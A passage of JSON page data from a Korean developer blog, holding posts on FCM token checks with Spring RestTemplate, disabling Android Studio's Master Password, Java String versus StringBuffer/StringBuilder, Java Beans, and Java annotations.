참고했습니다.\n\n이 부분은 자세하게 포스팅하여 해당 문서와 함께 업데이트 예정입니다.\n\n여기서 토큰을 전달하여 유효성을 체크하는 부분은 방법이 생겼습니다.\n\n하지만 Spring boot에서 어떤 식으로 Http 통신을 해야 할지가 다음 문제였습니다.\n\n<br>\n\n## Spring에서 Http 요청\n\n이 주제는 Spring Framework의 **RestTemplate**를 사용하여 해결하게 되었습니다.\n\nJava에서 Http 통신을 하기 위한 방법은 다양했지만, Spring에서 제공하는 기능을 이용하는게 더 빠를것 같아서 **RestTemplate**를 사용하게 되었습니다.\n\n참고로 요청 시 Header 정보에 **Authorization** 정보를 담아야 하는데 이 부분은 아래와 같이 입력해야 됩니다. (Key-value 형식)\n\n> \"Authorization\", \"key=[Your api key]\"\n\n<br>\n\n## 최종 목표?\n\n스케쥴러를 담당하는 서비스로직에서 쉽게 구현을 하였습니다.\n\n그런데 API를 PostMan 등으로 요청해보면 유효할 경우 Http Ok(200)과 함께 Json 형식으로 정보가 응답됩니다.\n\n하지만 유효하지 않은 토큰일 경우 404가 오고 잘못된 경우 400이 옵니다.\n\n200은 괜찮지만 200이 아닌 400, 404 등의 응답은 **try catch**로 받아서 처리해야 했습니다.\n\n아래의 코드를 참고해주시길...  \n(자세한 설명은 향후 포스팅 업데이트에서 다룰 예정입니다.)\n\n```java\ntry{\n    new RestTemplate().exchange(checkUrl+token.getToken(), HttpMethod.GET, new HttpEntity<>(headers), String.class);\n} catch (RestClientException e) {\n//FCM 토큰이 존재하지 않거나 문제가 있는 경우 -> 삭제\n}\n```\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-01) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Android Studio에서 Master Password 안드로이드 스튜디오에서 스토어 배포를 위해 서명을 할 때 앱 서명을 하려 하면 Master Password 암호 관련을 물어봅니다. 이 Master…","fields":{"slug":"/android/171101_androidstudiomasterpw/"},"frontmatter":{"date":"November 01, 2017","title":"Android Studio에서 Master Password 비활성(Disable) 방법","description":"Master Password 비활성 방법","tags":["Android Studio","Android"],"series":"Android","previewImage":"android_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-01) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Android Studio에서 Master Password\n\n안드로이드 스튜디오에서 스토어 배포를 위해 서명을 할 때 앱 서명을 하려 하면 **Master Password** 암호 관련을 물어봅니다.\n\n이 **Master Password**는 **KeyStore**와는 무관하며, Android Studio 사용자 인증을 위해서 사용하는 암호입니다.\n\n근데 **Master Password**를 설정한 뒤 **KeyStore**를 사용한 경우 서명을 할 때마다 물어보게 됩니다.\n\n문제는 이 **Master Password**를 잊은 경우 서명이 불가하며, 리셋을 할 경우 **KeyStore**암호를 입력해도 사용이 불가능해집니다.\n\n사실 개인적으로 사용하는 컴퓨터라 이런 기능을 사용할 필요가 없어서 비활성화를 찾아봤지만 어떻게 하는지 몰라서 결국 구글행...\n\n<br>\n\n# Master Password 비활성(Disable) 방법.\n\n1. **Preferences(설정)**을 들어갑니다.\n2. **Appearance & Behavior** -> **System Settings** -> **Passwords** 를 들어갑니다.\n\n<!-- ![](androidstudiomasterpw01.png) -->\n\n![](/androidstudiomasterpw01.png)\n\n3. 위 그림에서처럼 **Password storage policy**를 **Do not...**으로 맞추고 **Master Password**를 클릭하면 패스워드 설정이 나옵니다.\n4. 기존의 패스워드를 사용한다면 입력 후 새로운 암호를 공백으로 두면 **Disable**이 됩니다.\n\n<br>\n\n# (미세팁) Master Password가 자꾸 틀리다고 나올 경우.\n\n이건 간단한 팁이지만 **Master Password**가 자꾸 틀리다고 할때 **한/영**을 확인해봅시다.\n\n이거 때문에 몇번 아주 고생을 했었...\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-10-31) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 문서를 시작하면서... Java를 사용할 때 본인의 경우 가장 많이 사용하는 클래스는 아무래도 String이 아닐까 싶습니다. String을 쓰다보면 문자열을 새로 문자열을 넣거나 또는 변경을 하는 경우 s…","fields":{"slug":"/java/171031_javastrings/"},"frontmatter":{"date":"October 31, 2017","title":"Java의 String, StringBuffer, String Builder에 대하여","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-10-31) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 문서를 시작하면서...\n\nJava를 사용할 때 본인의 경우 가장 많이 사용하는 클래스는 아무래도 **String**이 아닐까 싶습니다.\n\n**String**을 쓰다보면 문자열을 새로 문자열을 넣거나 또는 변경을 하는 경우 **subString() 또는 split()** 를 주로 사용합니다.\n\n이것을 찾다보면 같이 마주치는 것은 **StringBuffer** 또는 **StringBuilder**가 있을 것입니다.\n\n아마 **면접질문** <b>(신입 또는 주니어급 개발자)</b>으로 저 세 가지의 차이점을 물어보는 경우가 많을 것입니다.\n\n이번 포스팅을 통해서 한번 정리를 해보려 합니다.\n\n<br>\n\n## Java의 String.\n\n이번 포스팅에서는 Java의 **String**을 집중적으로 포커싱을 하는 글은 아니니 간략하게만 확인하고 넘어가도록 하겠습니다.\n\n**String**은 일단 **불가변적(Immutable)**입니다.\n\n이걸 쉽게 설명하자면 값을 변경하는 것이 불가능하다는 이야기입니다.\n\n하지만 우리는 이런 사실을 잊고 아래와 같이 자연스럽게 사용합니다.\n\n```java\nString testStr = \"Hello World\";\ntestStr = \"Hello One\";\n```\n\n위 선언 중 첫 번째 줄에서는 testStr에 \"Hello World\"라는 문자열의 값이 들어가게 됩니다.\n\n하지만 두번 째 라인에서는 testStr에는 \"Hello One\" 문자열이 들어갑니다.\n\n위와 같은 작업을 할 때는 기존의 testStr 객체의 메모리 공간에 \"Hello World\"의 내용을 변경하는 것이 아닌,  \n**기존의 공간에서 새로운 공간을 할당한 후** 문자열을 생성합니다.\n\n결국 저장된 문자열을 변경하는 것이 아닌 **새로운 객체를 만들어서 반환**하는 것입니다.\n\n이것을 가리켜 **불가변적(Immutable) 이다** 라고 표현합니다.\n\n물론 이 <b>불가변적(Immutable)</b>인 객체는 사용이 간단하고, 멀티 쓰레드 환경에서 자유롭게 쓸 수 있는 장점이 있지만,  \n**엄청난 양의 문자열을 변경하거나 치환을 하는 작업**을 하게 될 경우 효율에 문제가 생길 수 있음을 예상할 수 있습니다.\n\n이런 문제를 봉착하게 되면 우리는 검색할 때 다음의 키워드를 확인하게 됩니다.\n\n<br>\n\n## StringBuffer, StringBuilder. 우리는 String의 친척\n\n위에서 확인한 **String** 의 경우 문자열 **변경**을 하는 것이 아닌 새로 객체를 **생성하여 반환함**을 확인하였습니다.\n\n만약 당신이 엄청난 문자열 연산을 하게 될 예정이라면 지금 소개하는 **StringBuffer** 또는 **StringBuilder**를 사용하면 됩니다.\n\n```java\nStringBuffer testStr = new StringBuffer(\"Hello Wolrd\";);\ntestStr.delete(5,10);\n```\n\n위의 경우는 **StringBuffer**로 생성한 testStr을 delete 메서드를 사용하여 문자열을 변경한 예제입니다.\n\ntestStr의 경우 결국 \"Hello\" 라는 문자열만 남게 될 것입니다.\n\n즉 새롭게 생성을 하는 것이 아닌 기존의 객체에서 문자열 변경을 하는 것입니다.\n\n이 **StringBuffer**나 **StringBuilder**의 경우 문자열 연산을 진행하며 버퍼 공간이 부족한 경우, 기존의 버퍼 크기를 늘리며 동작합니다.\n\n만약 **작은 규모의 String**의 문자열 변경의 경우 자꾸 변경할 경우 문자열 객체를 만들고 지우고를 반복하니  \n성능에 문제가 있지 않을까 싶지만...\n\n이런 경우 그냥 **String**을 사용해도 무방합니다.\n\n변경을 위한 연산을 진행하는 비용보다 새로 메모리 공간을 할당해서 사용하는 비용이 더 낮기 때문입니다.\n\n위에서도 이야기 하였지만 엄청난 문자열 변경 연산을 할 경우에만 **StringBuffer**, **StringBuilder**를 사용하는 것이 좋습니다.\n\n<br>\n\n## StringBuffer, StringBuilder 너희 둘의 차이점?\n\n그런데 이 두 가지의 차이점은 무엇일까요?\n\n**StringBuffer**의 경우 <b>동기화(Synchronization)를 보장</b>하고,  \n**StringBuilder**의 경우 <b>동기화(Synchronization)를 보장하지 않습니다.</b>.\n\n즉 **Multi Thread** 환경에서는 **StringBuffer** 를 사용하고,  \n**Single Thread** 환경에서는 **StringBuilder**를 사용하면 됩니다.\n\n<br>\n\n## 새로운 부분\n\n과거 JDK 1.5 버전에서는 String에서 문자열 연산(+, concat 등)을 할 때 성능상의 이슈가 있었지만,  \nJDK1.5 버전 이후부터는 컴파일 단계에서 String 객체의 문자열 연산을 사용할 경우 StringBuilder로 컴파일 되도록 변경되었습니다.\n\n<br>\n\n## 결론\n\n**String**은 짧은 문자열을 더하거나, 간단한 문자열 처리를 할 때 사용하고,  \n**StringBuffer**는 쓰레드에 안전한 프로그램이 필요할 때나, 개발 중인 시스템의 부분이 쓰레드에 안전한지 모를 경우 사용합니다.\n**StringBuilder**는 쓰레드에 안전성 여부에 관계가 없는 소프트웨어를 개발할 때 사용합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-10-31) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Java Bean 이란? 처음 자바 개발을 하다가 Java Bean이란 용어를 듣게 되었습니다. 구글에서 다양한 블로그에서 검색을 하여 찾아보았고, 이것을 정리하여 블로그 포스팅을 하게 되었습니다. Java…","fields":{"slug":"/java/171031_javabean/"},"frontmatter":{"date":"October 31, 2017","title":"Java Bean이란?","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-10-31) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Java Bean 이란?\n\n처음 자바 개발을 하다가 **Java Bean**이란 용어를 듣게 되었습니다.  \n구글에서 다양한 블로그에서 검색을 하여 찾아보았고, 이것을 정리하여 블로그 포스팅을 하게 되었습니다.\n\n<br>\n\n### Java Bean의 정의\n\n- 데이터를 표현하는 것을 목적으로 하는 자바 클래스.\n- 컴포넌트와 비슷한 의미로도 사용된다.\n- JavaBean 규격서에 따라 작성된 자바 클래스를 가리킨다.\n\n<br>\n\n### Java Bean의 규격\n\n- 클래스는 패키지화 하여야 한다.\n- 멤버변수는 프로퍼티(Property)라 칭한다.\n- 클래스는 필요에 따라 직렬화가 가능하다.\n- 프로퍼티의 접근자는 private이다.\n- 프로퍼티마다 getter/setter 가 존재해야 하며, 그 이름은 각각 get/set으로 시작해야 한다.\n- 위의 프로퍼티 getter/setter 메서드의 접근자는 public이어야 한다.\n- 외부에서 프로퍼티에 접근은 메서드를 통해서 접근한다.\n- 프로퍼티는 반드시 읽기/쓰기가 가능해야 하지만, 읽기 전용인 경우 getter만 정의할 수 있다.\n- getter의 경우 파라미터가 존재하지 않아야 하고, setter의 경우 한 개 이상의 파라미터가 존재한다.\n- 프로퍼티의 형이 boolean일 경우 get 메서드 대신 is메서드를 사용해도 된다.\n\n<br>\n\n### Java Bean의 형태 예제\n\n형태는 아래의 소스코드를 참고해주시길...\n\n```java\npackage 패키지_명;\n\n[import 패키지_명;]\n\npublic class Bean_ClassName [ implements java.io.Serializable ] {\n\tprivate String name;    // 값을 저장하는 속성 정의(필드)\n\tpublic Bean_ClassName() { }    // 기본 생성자\n\n\tpublic String getName() {    // 필드 값을 읽어오는 메소드\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {    // 필드 값을 저장하는 메소드\n\t\tthis.name = name;\n\t}\n}\n```\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-02-14) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Java에서 어노테이션(Annotation) 이란? 자바 개발을 하다 보면 클래스 또는 메서드 또는 변수 앞에 @Override 같은 @ 표시를 많이 봤을 것입니다. 이 어노테이션은 JEE5(Java Pla…","fields":{"slug":"/java/171214_java-annotation/"},"frontmatter":{"date":"February 14, 2017","title":"Java에서 어노테이션(Annotation)이란?","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-02-14) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Java에서 어노테이션(Annotation) 이란?\n\n자바 개발을 하다 보면 클래스 또는 메서드 또는 변수 앞에 **@Override** 같은 **@** 표시를 많이 봤을 것입니다.  \n이 어노테이션은 JEE5(Java Platform, Enterprise Edition 5)부터 새롭게 추가된 요소입니다.\n\n이 어노테이션으로 인해 데이터의 유효성 검사 등을 쉽게 알 수 있고, 이와 관련한 코드가 깔끔해지게 됩니다.  \n일단 어노테이션의 용도는 다양한 목적이 있지만 **메타 데이터**의 비중이 가장 크다 할 수 있습니다.\n\n> 메타-테이터(Meta-Data) : 데이터를 위한 데이터를 의미하며, 풀어 이야기하면 한 데이터에 대한 설명을 의미하는 데이터. (자신의 정보를 담고 있는 데이터)\n\n### Java에서 기본적으로 제공하는 어노테이션 종류\n\n1. **@Override**\n\n   - 선언한 메서드가 오버라이드 되었다는 것을 나타냅니다.\n   - 만약 상위(부모) 클래스(또는 인터페이스)에서 해당 메서드를 찾을 수 없다면 컴파일 에러를 발생 시킵니다.\n\n2) **@Deprecated**\n\n   - 해당 메서드가 더 이상 사용되지 않음을 표시합니다.\n   - 만약 사용할 경우 컴파일 경고를 발생 키십니다.\n\n3. **@SuppressWarnings**\n\n   - 선언한 곳의 컴파일 경고를 무시하도록 합니다.\n\n4. **@SafeVarargs**\n\n   - Java7 부터 지원하며, 제너릭 같은 가변인자의 매개변수를 사용할 때의 경고를 무시합니다.\n\n5. **@FunctionalInterface**\n\n   - Java8 부터 지원하며, 함수형 인터페이스를 지정하는 어노테이션입니다.\n   - 만약 메서드가 존재하지 않거나, 1개 이상의 메서드(default 메서드 제외)가 존재할 경우 컴파일 오류를 발생 시킵니다.\n\n<br>\n\n## 어노테이션은 어떻게 구성되어 있을까?\n\n먼저 어노테이션의 구조를 보기 위해서 아래의 코드를 참고해 봅니다. (예를 위해 작성된 커스텀 어노테이션입니다.)\n\n```java\n@Target(ElementType.METHOD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface CustomAnnotation {\n\tboolean isCheck() default true;\n}\n```\n\n먼저 1번, 2번의 어노테이션 선언에 쓰인 어노테이션은 **메타 어노테이션(Meta Annotation)**이라 하며 이를 이용해 커스텀 어노테이션을 작성할 수 있게 됩니다.\n\n### 메타 어노테이션의 종류\n\n1.  **@Retention**\n\n    - 자바 컴파일러가 어노테이션을 다루는 방법을 기술하며, 특정 시점까지 영향을 미치는지를 결정합니다.\n    - 종류는 다음과 같습니다. - **RetentionPolicy.SOURCE** : 컴파일 전까지만 유효. (컴파일 이후에는 사라짐) - **RetentionPolicy.CLASS** : 컴파일러가 클래스를 참조할 때까지 유효. - **RetentionPolicy.RUNTIME** : 컴파일 이후에도 JVM에 의해 계속 참조가 가능. (리플렉션 사용)\n\n2.  **@Target**\n\n    - 어노테이션이 적용할 위치를 선택합니다.\n    - 종류는 다음과 같습니다.\n\n      - ElementType.PACKAGE : 패키지 선언\n        - ElementType.TYPE : 타입 선언\n        - ElementType.ANNOTATION_TYPE : 어노테이션 타입 선언\n        - ElementType.CONSTRUCTOR : 생성자 선언\n        - ElementType.FIELD : 멤버 변수 선언\n        - ElementType.LOCAL_VARIABLE : 지역 변수 선언\n        - ElementType.METHOD : 메서드 선언\n        - ElementType.PARAMETER : 전달인자 선언\n        - ElementType.TYPE_PARAMETER : 전달인자 타입 선언\n        - ElementType.TYPE_USE : 타입 선언\n\n3)  **@Documented**\n\n    - 해당 어노테이션을 Javadoc에 포함시킵니다.\n\n4)  **@Inherited**\n\n    - 어노테이션의 상속을 가능하게 합니다.\n\n5)  **@Repeatable**\n\n    - Java8 부터 지원하며, 연속적으로 어노테이션을 선언할 수 있게 해줍니다.\n\n<br>\n\n어노테이션은 기본적으로 인터페이스 형태를 취하고 있으며, 단지 interface 앞에 **@** 표시를 해줍니다.  \n어노테이션의 필드에서는 **enum**, String이나 기본 자료형, 기본 자료형의 배열을 사용할 수 있습니다.\n\n어노테이션에 대한 이론적인 부분은 여기까지이며, 이를 활용하여 커스텀 어노테이션을 작성하는 것은 다음 포스트에서 다루도록 하겠습니다.\n\n[커스텀 어노테이션 만들고 사용하기](https://elfinlas.github.io/java/171214_java-custom-anotation-01/)\n\n```toc\n\n```\n"}]}},"pageContext":{}},"staticQueryHashes":[],"slicesMap":{}}